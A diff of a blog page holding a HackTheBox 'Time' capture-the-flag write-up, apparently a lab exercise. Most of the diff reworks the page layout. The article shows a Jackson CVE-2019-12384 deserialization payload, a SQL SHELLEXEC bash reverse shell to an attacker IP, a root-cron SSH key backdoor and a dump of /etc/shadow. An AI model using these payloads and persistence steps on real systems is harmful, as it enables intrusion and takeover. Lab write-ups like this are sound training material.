@@ -3,34 +3,38 @@
 
 <head>
   <meta charset="utf-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <!-- iOS Safari -->
-  <meta name="apple-mobile-web-app-capable" content="yes">
-  <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
-  <!-- Chrome, Firefox OS and Opera Status Bar Color -->
-  <meta name="theme-color" content="#FFFFFF">
-  <meta property="og:title" content="Time - 10.10.10.214">
-  
-  <meta name="description" content="Medium-difficulty Linux box on exploiting SSRF vulnerability CVE-2019-12384 in Jackson and leveraging a privileged shell script to gain root.">
-  <meta property="og:description" content="Medium-difficulty Linux box on exploiting SSRF vulnerability CVE-2019-12384 in Jackson and leveraging a privileged shell script to gain root.">
-  
-  <meta property="og:type" content="blog">
-  <title>Time - 10.10.10.214</title>
-  <!-- Favicon -->
-  
-  <link rel="shortcut icon" href="https://samillwong.github.io/images/profile.jpg">
-  
-  <link rel="stylesheet" type="text/css" href="https://cdnjs.cloudflare.com/ajax/libs/KaTeX/0.11.1/katex.min.css">
-  <link rel="stylesheet" type="text/css"
-    href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.19.0/themes/prism.min.css">
-  <link rel="stylesheet" type="text/css" href="css/SourceSansPro.css">
-  <link rel="stylesheet" type="text/css" href="css/notablog.css">
-  <link rel="stylesheet" type="text/css" href="css/theme.css">
-  <style>
-    :root {
-      font-size: 18px;
-    }
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<!-- iOS Safari -->
+<meta name="apple-mobile-web-app-capable" content="yes">
+<meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+<!-- Chrome, Firefox OS and Opera Status Bar Color -->
+<meta name="theme-color" content="#FFFFFF">
+<link rel="stylesheet" type="text/css" href="https://cdnjs.cloudflare.com/ajax/libs/KaTeX/0.11.1/katex.min.css">
+<link rel="stylesheet" type="text/css"
+  href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.19.0/themes/prism.min.css">
+<link rel="stylesheet" type="text/css" href="css/SourceSansPro.css">
+<link rel="stylesheet" type="text/css" href="css/theme.css">
+<link rel="stylesheet" type="text/css" href="css/notablog.css">
+<!-- Favicon -->
 
+  <link rel="shortcut icon" href="https://samiko.me/images/profile.jpg">
+
+<style>
+  :root {
+    font-size: 20px;
+  }
+</style>
+  <title>Time - HackTheBox Writeup (10.10.10.214)&nbsp;|&nbsp;samiko@127.0.0.1~$</title>
+  <meta property="og:type" content="blog">
+  <meta property="og:title" content="Time - HackTheBox Writeup (10.10.10.214)">
+  
+    <meta name="description" content="Medium-difficulty Linux box on exploiting SSRF vulnerability CVE-2019-12384 in Jackson and leveraging a privileged shell script to gain root.">
+    <meta property="og:description" content="Medium-difficulty Linux box on exploiting SSRF vulnerability CVE-2019-12384 in Jackson and leveraging a privileged shell script to gain root.">
+  
+  
+    <meta property="og:image" content="https://www.hackthebox.eu/storage/avatars/0ea788f1a1ee9955fd374fd871cadd60.png">
+  
+  <style>
     .DateTagBar {
       margin-top: 1.0rem;
     }
@@ -39,92 +43,99 @@
 
 <body>
   <nav class="Navbar">
-    <a href="/">
-      <div class="Navbar__Btn"><span><img class="inline-img-icon" src="https://samillwong.github.io/images/profile.jpg"></span> <span>Home</span></div>
-    </a>
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-  </nav>
-  <header class="Header">
+  <a href="/">
+    <div class="Navbar__Btn">
       
+        <span><img class="inline-img-icon" src="https://samiko.me/images/profile.jpg"></span>&nbsp;
+      
+      <span>Home</span>
+    </div>
+  </a>
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+</nav>
+  <header class="Header">
+    
     <div class="Header__Spacer Header__Spacer--NoCover">
     </div>
     
-    <div class="Header__Icon"><span><img class="inline-img-icon" src="https://www.hackthebox.eu/storage/avatars/0ea788f1a1ee9955fd374fd871cadd60.png"></span></div>
+      <div class="Header__Icon">
+        <span><img class="inline-img-icon" src="https://www.hackthebox.eu/storage/avatars/0ea788f1a1ee9955fd374fd871cadd60.png"></span>
+      </div>
     
-    <h1 class="Header__Title">Time - 10.10.10.214</h1>
+    <h1 class="Header__Title">Time - HackTheBox Writeup (10.10.10.214)</h1>
+    
+      <div class="DateTagBar">
         
-    <div class="DateTagBar">
-          
-      <span class="DateTagBar__Item DateTagBar__Date">Posted on Sun, Apr 11, 2021</span>
-          
-          
-      <span class="DateTagBar__Item DateTagBar__Tag DateTagBar__Tag--yellow">
-          <a href="tag/Medium">Medium</a>
-      </span>
-      
-      <span class="DateTagBar__Item DateTagBar__Tag DateTagBar__Tag--orange">
-          <a href="tag/Linux">Linux</a>
-      </span>
-      
-      <span class="DateTagBar__Item DateTagBar__Tag DateTagBar__Tag--red">
-          <a href="tag/Web_Application">Web Application</a>
-      </span>
-      
-      <span class="DateTagBar__Item DateTagBar__Tag DateTagBar__Tag--brown">
-          <a href="tag/Jackson">Jackson</a>
-      </span>
-      
-      <span class="DateTagBar__Item DateTagBar__Tag DateTagBar__Tag--orange">
-          <a href="tag/Command_Injection">Command Injection</a>
-      </span>
-      
-    </div>
-    <div class="Article__Desc">
+          <span class="DateTagBar__Item DateTagBar__Date">Posted on Sun, Apr 11, 2021</span>
+        
+        
+          <span class="DateTagBar__Item DateTagBar__Tag DateTagBar__Tag--yellow">
+            <a href="tag/Medium">Medium</a>
+          </span>
+        
+          <span class="DateTagBar__Item DateTagBar__Tag DateTagBar__Tag--orange">
+            <a href="tag/Linux">Linux</a>
+          </span>
+        
+          <span class="DateTagBar__Item DateTagBar__Tag DateTagBar__Tag--red">
+            <a href="tag/Web_Application">Web Application</a>
+          </span>
+        
+          <span class="DateTagBar__Item DateTagBar__Tag DateTagBar__Tag--brown">
+            <a href="tag/Jackson">Jackson</a>
+          </span>
+        
+          <span class="DateTagBar__Item DateTagBar__Tag DateTagBar__Tag--orange">
+            <a href="tag/Command_Injection">Command Injection</a>
+          </span>
+        
+      </div>
+      <div>
         Medium-difficulty Linux box on exploiting SSRF vulnerability CVE-2019-12384 in Jackson and leveraging a privileged shell script to gain root.
-    </div>
-        
+      </div>
+    
   </header>
-      <article id="https://www.notion.so/e38384c05f454cfb98cbc354439e8753" class="PageRoot PageRoot--FullWidth"><h2 id="https://www.notion.so/f7e4d9c3d4614e349e7942c1b4fdc7a3" class="ColorfulBlock ColorfulBlock--ColorDefault Heading Heading--2"><a class="Anchor" href="#https://www.notion.so/f7e4d9c3d4614e349e7942c1b4fdc7a3"><svg width="16" height="16" viewBox="0 0 16 16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a><span class="SemanticStringArray"><span class="SemanticString">Recon</span></span></h2><ul class="BulletedListWrapper"><li id="https://www.notion.so/4fe7da619fbd4c4faeaa6e9defd7ac6c" class="BulletedList"><span class="SemanticStringArray"><span class="SemanticString">Port scan:</span></span><div id="https://www.notion.so/949e77a9730d4245809581ea34579e16" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">$ nmap -p- 10.10.10.214 &gt; ports.nmap</code></span></span></p></div><pre id="https://www.notion.so/d60db59b7f0e44c0b41c34a820c393d3" class="Code Code--NoWrap"><code><span class="SemanticStringArray"><span class="SemanticString"><span>PORT     STATE SERVICE
+  <article id="https://www.notion.so/e38384c05f454cfb98cbc354439e8753" class="PageRoot PageRoot--FullWidth"><h2 id="https://www.notion.so/f7e4d9c3d4614e349e7942c1b4fdc7a3" class="ColorfulBlock ColorfulBlock--ColorDefault Heading Heading--2"><a class="Anchor" href="#https://www.notion.so/f7e4d9c3d4614e349e7942c1b4fdc7a3"><svg width="16" height="16" viewBox="0 0 16 16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a><span class="SemanticStringArray"><span class="SemanticString">Recon</span></span></h2><ul class="BulletedListWrapper"><li id="https://www.notion.so/4fe7da619fbd4c4faeaa6e9defd7ac6c" class="BulletedList"><span class="SemanticStringArray"><span class="SemanticString">Port scan:</span></span><div id="https://www.notion.so/949e77a9730d4245809581ea34579e16" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">$ nmap -p- 10.10.10.214 &gt; ports.nmap</code></span></span></p></div><pre id="https://www.notion.so/d60db59b7f0e44c0b41c34a820c393d3" class="Code Code--NoWrap"><code><span class="SemanticStringArray"><span class="SemanticString"><span>PORT     STATE SERVICE
 22/tcp   open  ssh
 80/tcp   open  http</span></span></span></code></pre></li><li id="https://www.notion.so/960da0d6a55b4c0a9b51b441535a8c12" class="BulletedList"><span class="SemanticStringArray"><span class="SemanticString">Targeted scan:</span></span><div id="https://www.notion.so/0ec8f0349b1e43dd936941d31e3f0f83" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">$ nmap -p 22,80,6666 -sC -sV 10.10.10.220 &gt; scan.nmap</code></span></span></p></div><pre id="https://www.notion.so/ac4cb5ed269a473bbd916e829e28250e" class="Code Code--NoWrap"><code><span class="SemanticStringArray"><span class="SemanticString"><span>PORT     STATE SERVICE VERSION
 22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 (Ubuntu Linux; protocol 2.0)
@@ -144,12 +155,10 @@
 $$<span class="token punctuation">;</span>
 <span class="token keyword">CALL</span> SHELLEXEC<span class="token punctuation">(</span><span class="token string">'setsid bash -i &amp;>/dev/tcp/10.10.14.53/6969 0>&amp;1 &amp;'</span><span class="token punctuation">)</span></span></span></span></code></pre></li><li id="https://www.notion.so/ca07729bdef24ecfa90424d6ce2d4b06" class="BulletedList"><span class="SemanticStringArray"><span class="SemanticString">Host the payload on a HTTP server with </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">python -m http.server</code></span><span class="SemanticString"> or </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">updog</code></span><span class="SemanticString">.</span></span></li><li id="https://www.notion.so/95e739ebf35e49649e5c6095d0e8eb3e" class="BulletedList"><span class="SemanticStringArray"><span class="SemanticString">Listen for a reverse shell with netcat:</span></span><div id="https://www.notion.so/be94fb24a1cc48e59a221398c9ac5608" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">$ nc -lvnp 6969</code></span></span></p></div></li><li id="https://www.notion.so/86f937cf1c4a4312b8b0b498b8f9f936" class="BulletedList"><span class="SemanticStringArray"><span class="SemanticString">Make the server execute the remote code by validating the following JSON:</span></span><pre id="https://www.notion.so/ed798c51cece4a2e90dee6210476ae94" class="Code Code--NoWrap"><code><span class="SemanticStringArray"><span class="SemanticString"><span><span class="token punctuation">[</span><span class="token string">"ch.qos.logback.core.db.DriverManagerConnectionSource"</span><span class="token punctuation">,</span><span class="token punctuation">{</span><span class="token property">"url"</span><span class="token operator">:</span><span class="token string">"jdbc:h2:mem:;TRACE_LEVEL_SYSTEM_OUT=3;INIT=RUNSCRIPT FROM 'http://10.10.14.53:9090/inject.sql'"</span><span class="token punctuation">}</span><span class="token punctuation">]</span></span></span></span></code></pre></li><li id="https://www.notion.so/52b03218c6f6460facbf821057b3aa20" class="BulletedList"><span class="SemanticStringArray"><span class="SemanticString">We get a shell as pericles:</span></span><div id="https://www.notion.so/f5a527327a77436cbb971d16e2835969" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">$ whoami</code></span></span></p></div><pre id="https://www.notion.so/042445d1752c4260b909c85e67d3a580" class="Code Code--NoWrap"><code><span class="SemanticStringArray"><span class="SemanticString"><span>pericles</span></span></span></code></pre></li><li id="https://www.notion.so/716630c16cd448649f9882b3d1ce402f" class="BulletedList"><span class="SemanticStringArray"><span class="SemanticString">Get user flag!</span></span></li></ul><h2 id="https://www.notion.so/caa6bb05985e4af9b98b4c1ccdb5dea3" class="ColorfulBlock ColorfulBlock--ColorDefault Heading Heading--2"><a class="Anchor" href="#https://www.notion.so/caa6bb05985e4af9b98b4c1ccdb5dea3"><svg width="16" height="16" viewBox="0 0 16 16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a><span class="SemanticStringArray"><span class="SemanticString">Privilege Escalation</span></span></h2><ul class="BulletedListWrapper"><li id="https://www.notion.so/e25639e135004a01aeecd05277798ea3" class="BulletedList"><span class="SemanticStringArray"><span class="SemanticString">Running LinPEAS, and finding file of interest:</span></span><div id="https://www.notion.so/4ebbcd13a4e542d98ce6f6a76655f46a" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">$ linpeas.sh</code></span></span></p></div><pre id="https://www.notion.so/ec4cd04627514426861ddc96cccd5842" class="Code Code--NoWrap"><code><span class="SemanticStringArray"><span class="SemanticString"><span>/usr/bin/timer_backup.sh</span></span></span></code></pre></li><li id="https://www.notion.so/9548dca562074bd1a4581116374ced44" class="BulletedList"><span class="SemanticStringArray"><span class="SemanticString">Looking deeper:</span></span><div id="https://www.notion.so/0e6ef08332314a58bb940a4023a85023" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">$ stat /usr/bin/timer_backup.sh</code></span></span></p></div></li><li id="https://www.notion.so/75ad30f308454a1da8912963c662ec27" class="BulletedList"><span class="SemanticStringArray"><span class="SemanticString">It seems that this script is regularly accessed by root, and is owned and editable by pericles.</span></span></li><li id="https://www.notion.so/942e78294a5f488ab25ed50d90544be9" class="BulletedList"><span class="SemanticStringArray"><span class="SemanticString">This means we can leverage this script to execute any code with root privileges.</span></span></li><li id="https://www.notion.so/ada331df806140bdb83b0490f7089933" class="BulletedList"><span class="SemanticStringArray"><span class="SemanticString">As it is likely required by a cron job, which executes the script&#x27;s contents on a regular schedule, we cannot rely on it to give us a shell.</span></span></li><li id="https://www.notion.so/d1935557adb743fc96698187974732f0" class="BulletedList"><span class="SemanticStringArray"><span class="SemanticString">Instead, let&#x27;s have it add our SSH public key to the root user&#x27;s list of </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">authorized_keys</code></span><span class="SemanticString">.</span></span></li><li id="https://www.notion.so/94d9d2beaf69494e8b2d67313ad9bb28" class="BulletedList"><span class="SemanticStringArray"><span class="SemanticString">From the target host, download our </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">id_rsa.pub</code></span><span class="SemanticString"> key with curl:</span></span><div id="https://www.notion.so/2f8386d292c64068ad9273ef30cd47ca" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">$ curl -O 10.10.14.53:9090/id_rsa.pub</code></span></span></p></div></li><li id="https://www.notion.so/bc4b8f4c283b4baaaa7877f2fd5306d0" class="BulletedList"><span class="SemanticStringArray"><span class="SemanticString">Append the following line to the timed script, such that next time the script activates, we will be added to the list of authorised users to SSH into root:</span></span><div id="https://www.notion.so/0ad0cccfae4f4c618f86934f4eaf48ea" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">$ echo &quot;echo {id_rsa.pub} &gt;&gt; /root/.ssh/authorized_keys&quot; &gt;&gt; /usr/bin/timer_backup.sh</code></span></span></p></div></li><li id="https://www.notion.so/602064474f0a4658a1bfc81e9aa22f90" class="BulletedList"><span class="SemanticStringArray"><span class="SemanticString">Wait for a bit, then SSH into root using our SSH key:</span></span><div id="https://www.notion.so/3eb4a3266806412bae46a72c627f67e9" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">$ ssh -i ~/.ssh/id_rsa root@10.10.10.214</code></span></span></p></div></li><li id="https://www.notion.so/9d4cb89d17b6488fb59dee55ce89c15e" class="BulletedList"><span class="SemanticStringArray"><span class="SemanticString">We&#x27;re now on the machine as root.</span></span></li><li id="https://www.notion.so/a9dd6cc09ef045e8bfe851f563a661ae" class="BulletedList"><span class="SemanticStringArray"><span class="SemanticString">Get root flag!</span></span></li></ul><h2 id="https://www.notion.so/b81636bd1799436cae60ff2c0ac59f3a" class="ColorfulBlock ColorfulBlock--ColorDefault Heading Heading--2"><a class="Anchor" href="#https://www.notion.so/b81636bd1799436cae60ff2c0ac59f3a"><svg width="16" height="16" viewBox="0 0 16 16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a><span class="SemanticStringArray"><span class="SemanticString">Persistence</span></span></h2><ul class="BulletedListWrapper"><li id="https://www.notion.so/83f37ab4ca36406890e1b876132a3725" class="BulletedList"><span class="SemanticStringArray"><span class="SemanticString">Get the root hash from shadow file:</span></span><div id="https://www.notion.so/566e48c6975640ac9e95f6cb7c9a9297" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">$ cat /etc/shadow</code></span></span></p></div><pre id="https://www.notion.so/3916f978543041b08429f3bd71afc048" class="Code Code--NoWrap"><code><span class="SemanticStringArray"><span class="SemanticString"><span>root:$6$tQUjJ4lm/s2nyGlV$ApmVk8.fwtUjA7XlmZn3dn7hATdrg1if1nKnRBu9qrbF6rB5dfiwpkz7gQhdr5YIeqqKjBGif06acgM3stn991:18542:0:99999:7:::</span></span></span></code></pre></li></ul><h2 id="https://www.notion.so/7495b9dfb2254392904790a6671371fe" class="ColorfulBlock ColorfulBlock--ColorDefault Heading Heading--2"><a class="Anchor" href="#https://www.notion.so/7495b9dfb2254392904790a6671371fe"><svg width="16" height="16" viewBox="0 0 16 16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a><span class="SemanticStringArray"><span class="SemanticString">Resources</span></span></h2><ol class="NumberedListWrapper"><li id="https://www.notion.so/b9b0121253ec42618f49517b3a512d95" class="NumberedList" value="1"><span class="SemanticStringArray"><span class="SemanticString">https://blog.doyensec.com/2019/07/22/jackson-gadgets.html</span></span></li><li id="https://www.notion.so/be097a6038424a08a2b2ec0bd4b6bd7f" class="NumberedList" value="2"><span class="SemanticStringArray"><span class="SemanticString">https://github.com/jas502n/CVE-2019-12384</span></span></li><li id="https://www.notion.so/e814c93ec1fe4250bfdd180c5e6b5be1" class="NumberedList" value="3"><span class="SemanticStringArray"><span class="SemanticString">https://stackoverflow.com/questions/49822202/com-fasterxml-jackson-databind-exc-mismatchedinputexception-unexpected-token-s</span></span></li></ol></article>
   <footer class="Footer">
-        <div>&copy; samiko@127.0.0.1~$ &centerdot; 2021</div>
-        <div>&centerdot;</div>
-        <div>Powered by <a href="https://github.com/dragonman225/notablog" target="_blank"
-            rel="noopener noreferrer">Notablog</a>.
-        </div>
-    </footer>
+  <div>samiko@127.0.0.1~$</div>
+  <div>&centerdot;</div>
+  <div>Powered by <a href="https://github.com/dragonman225/notablog" target="_blank" rel="noopener noreferrer">Notablog</a>.</div>
+</footer>
 </body>
 
 </html>
